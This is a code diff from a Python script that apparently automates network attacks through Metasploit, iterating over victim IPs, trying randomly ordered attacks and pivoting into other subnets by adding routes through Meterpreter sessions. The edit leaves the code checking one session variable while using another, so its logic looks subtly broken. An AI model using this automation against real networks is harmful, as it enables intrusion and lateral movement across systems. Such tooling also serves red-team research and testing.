@@ -54,12 +54,10 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
 
     while(machines):
-        #extract the first victim
         target_ip=machines.pop(0)
         print(f"{C.COL_GREEN} [+] target for this step: {target_ip} {C.COL_RESET}")
 
         attack=list(Attack_DB.attack_dict)
-
         randomized_attack=random.sample(attack,len(attack))
 
         if(atk_sess!=None):
@@ -67,20 +65,19 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
 
         if(target_ip in other_subnet):
+
             if(atk_sess==None):
                 print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
                 return 
-            print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
 
-            #met_sess=mc.upgrade_shell(atk_sess)
-
-            if(met_sess):
+            if(atk_sess!=None):
+                print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                 print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
                 mc.route_add(met_sess["id_sess"], target_ip)
                 mc.route_print()
                 router=met_sess
             else:
-                print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
+                #print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
                 continue
         
         if(stealth):
